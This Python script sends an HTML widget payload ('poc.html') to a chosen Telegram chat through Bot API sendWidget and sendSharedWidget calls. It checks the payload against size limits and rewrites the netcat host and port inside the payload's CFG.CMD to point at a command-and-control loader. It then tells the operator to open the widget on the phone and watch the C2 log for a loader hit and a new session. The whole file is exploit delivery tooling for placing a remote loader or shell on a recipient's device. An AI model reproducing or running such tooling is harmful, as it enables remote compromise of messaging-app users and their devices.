#!/usr/bin/env python3
"""Send a Telegram widget through the Bot API, or share a shared widget.

The HTML is the payload under test. The script never stores a token: pass
--token or set BOT_TOKEN.

Usage:
    export BOT_TOKEN='<BOT_TOKEN>'
    python3 send_widget.py --html <widget.html> --chat-id <CHAT_ID> --dry-run
    python3 send_widget.py --html <widget.html> --chat-id <CHAT_ID> \
        --allow-queries --background-query
    python3 send_widget.py --html <widget.html> --chat-id <CHAT_ID> --is-shared
    python3 send_widget.py --share-chat-id <OTHER_CHAT_ID> --share-widget-id <ID>

Endpoints (both served natively since 2026-11-08):
    POST https://api.telegram.org/beta/bot<BOT_TOKEN>/sendWidget
    POST https://api.telegram.org/bot<BOT_TOKEN>/sendWidget
    POST https://api.telegram.org/bot<BOT_TOKEN>/sendSharedWidget
    JSON body: {"chat_id": <int|string>, "html": "<widget html>"}

The beta prefix is the default for compatibility. `--api standard` uses the
standard base. `--is-shared` adds `"is_shared": true`; the response carries a
`widget.id` that `--share-widget-id/--share-chat-id` can place in another chat.
Forwarding a bot-created protected widget is refused; a user/third-party widget
copy is a different object (`is_copy: true`, unprotected) and is out of scope
for this sender.

Bot limits measured on the whitelisted widget bot: raw <= 32768 bytes and
zlib.compress(html, 9) <= 4096 bytes.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import sys
import urllib.error
import urllib.request
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_HTML = os.path.join(HERE, "poc.html")
API_ROOT = "https://api.telegram.org"
RAW_LIMIT = 32768
ZLIB_LIMIT = 4096


def endpoint(token: str, method: str, api: str) -> str:
    prefix = "" if api == "standard" else "/beta"
    return "%s%s/bot%s/%s" % (API_ROOT, prefix, token, method)


def safe_endpoint(api: str, method: str) -> str:
    prefix = "" if api == "standard" else "/beta"
    return "%s%s/bot<TOKEN>/%s" % (API_ROOT, prefix, method)


def load(path: str) -> str:
    with open(path, encoding="utf-8") as f:
        return f.read()


def rewrite_cmd(html: str, host: str, port: int) -> tuple[str, str]:
    """Rewrite the nc HOST PORT inside CFG.CMD, preserving all other bytes."""
    m = re.search(r'CMD:"([^"]*)"', html)
    if not m:
        raise SystemExit("[!] CFG.CMD not found in the HTML")
    cmd = m.group(1)
    n = re.search(r"\bnc\s+(\S+)\s+(\d+)", cmd)
    if not n:
        raise SystemExit("[!] 'nc HOST PORT' not found inside CFG.CMD")
    new_cmd = cmd[: n.start(1)] + host + cmd[n.end(1): n.start(2)] + str(port) + cmd[n.end(2):]
    new_html = html[: m.start(1)] + new_cmd + html[m.end(1):]
    return new_html, new_cmd


def report(html: str, label: str = "widget") -> None:
    raw = len(html.encode("utf-8"))
    comp = len(zlib.compress(html.encode("utf-8"), 9))
    sha = hashlib.sha256(html.encode("utf-8")).hexdigest()
    print("[*] %s: raw %d/%d, zlib-9 %d/%d, sha256 %s"
          % (label, raw, RAW_LIMIT, comp, ZLIB_LIMIT, sha))
    if raw > RAW_LIMIT:
        raise SystemExit("[!] raw size exceeds the bot limit")
    if comp > ZLIB_LIMIT:
        raise SystemExit("[!] zlib-9 size exceeds the bot limit (INPUT_MEDIA_WIDGET_TOO_LARGE)")


def post(url: str, body: dict, timeout: float) -> dict:
    req = urllib.request.Request(
        url,
        data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return json.loads(raw)
        except Exception:
            return {"ok": False, "description": raw[:400], "http": e.code}
    except urllib.error.URLError as e:
        return {"ok": False, "description": "connection error: %s" % e}


def send(token: str, chat_id: str, html: str, timeout: float, api: str,
         is_shared: bool = False, extra: dict | None = None) -> dict:
    body = {"chat_id": chat_id, "html": html}
    if is_shared:
        body["is_shared"] = True
    if extra:
        body.update({k: v for k, v in extra.items() if v is not None})
    return post(endpoint(token, "sendWidget", api), body, timeout)


def send_shared(token: str, chat_id: str, widget_id: str, timeout: float,
                api: str) -> dict:
    return post(endpoint(token, "sendSharedWidget", api),
                {"chat_id": chat_id, "widget_id": widget_id}, timeout)


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--html", default=DEFAULT_HTML, help="widget HTML (default: poc.html)")
    p.add_argument("--token", default=os.environ.get("BOT_TOKEN", ""),
                   help="bot token (default: $BOT_TOKEN); never hardcode it")
    p.add_argument("--api", choices=("beta", "standard"), default="beta",
                   help="Bot API base (default: beta)")
    p.add_argument("--chat-id", help="target chat id (int or @username)")
    p.add_argument("--host", help="rewrite CFG.CMD nc HOST (C2 loader address)")
    p.add_argument("--port", type=int, help="rewrite CFG.CMD nc PORT (loader port)")
    p.add_argument("--save", help="write the (rewritten) HTML to this path")
    p.add_argument("--is-shared", action="store_true",
                   help="ask sendWidget for a shared widget object (widget.id)")
    p.add_argument("--allow-queries", action="store_true",
                   help="pass allow_queries=true (required by TelegramWidget.request)")
    p.add_argument("--background-query", action="store_true",
                   help="pass background_query=true")
    p.add_argument("--height", type=int, help="widget bubble height")
    p.add_argument("--width", type=int, help="widget bubble width")
    p.add_argument("--share-widget-id", help="existing widget.id to place with sendSharedWidget")
    p.add_argument("--share-chat-id", help="destination chat id for --share-widget-id")
    p.add_argument("--dry-run", action="store_true", help="only check sizes / print the call")
    p.add_argument("--timeout", type=float, default=30.0)
    args = p.parse_args()

    if args.share_widget_id or args.share_chat_id:
        if not (args.share_widget_id and args.share_chat_id):
            raise SystemExit("[!] --share-widget-id and --share-chat-id must be used together")
        print("[*] POST %s" % safe_endpoint(args.api, "sendSharedWidget"))
        print("[*] share widget_id=%s to chat_id=%s"
              % (args.share_widget_id, args.share_chat_id))
        if args.dry_run:
            return 0
        if not args.token:
            raise SystemExit("[!] no token: pass --token or set BOT_TOKEN")
        res = send_shared(args.token, args.share_chat_id, args.share_widget_id,
                          args.timeout, args.api)
        if res.get("ok"):
            r = res.get("result") or {}
            print("[+] shared: message_id=%s" % r.get("message_id"))
            return 0
        print("[!] rejected: %s" % res.get("description", res))
        return 1

    if not os.path.isfile(args.html):
        raise SystemExit("[!] HTML not found: %s" % args.html)
    html = load(args.html)
    report(html, "original")

    if args.host or args.port:
        if not (args.host and args.port):
            raise SystemExit("[!] --host and --port must be used together")
        html, cmd = rewrite_cmd(html, args.host, args.port)
        print("[*] CFG.CMD: %s" % cmd)
        report(html, "customized")

    if args.save:
        with open(args.save, "w", encoding="utf-8") as f:
            f.write(html)
        print("[*] wrote %s" % args.save)
    if args.dry_run:
        print("[*] POST %s" % safe_endpoint(args.api, "sendWidget"))
        if args.is_shared:
            print("[*] body adds is_shared=true")
        for key in ("allow_queries", "background_query", "height", "width"):
            if getattr(args, key):
                print("[*] body adds %s=%s" % (key, getattr(args, key)))
        return 0

    if not args.token:
        raise SystemExit("[!] no token: pass --token or set BOT_TOKEN")
    if not args.chat_id:
        raise SystemExit("[!] --chat-id is required (unless --dry-run)")

    print("[*] POST %s /sendWidget chat_id=%s" % (args.api, args.chat_id))
    extra = {
        "allow_queries": True if args.allow_queries else None,
        "background_query": True if args.background_query else None,
        "height": args.height,
        "width": args.width,
    }
    res = send(args.token, args.chat_id, html, args.timeout, args.api,
               args.is_shared, extra)
    ok = bool(res.get("ok"))
    if ok:
        r = res.get("result") or {}
        print("[+] sent: message_id=%s" % r.get("message_id"))
        w = r.get("widget") or {}
        if w.get("id"):
            print("[+] widget.id=%s" % w["id"])
        print("[*] now open the widget on the phone; watch the C2 log for "
              "'loader: serving' and 'session 1 hello'")
        return 0
    print("[!] rejected: %s" % res.get("description", res))
    return 1


if __name__ == "__main__":
    sys.exit(main())
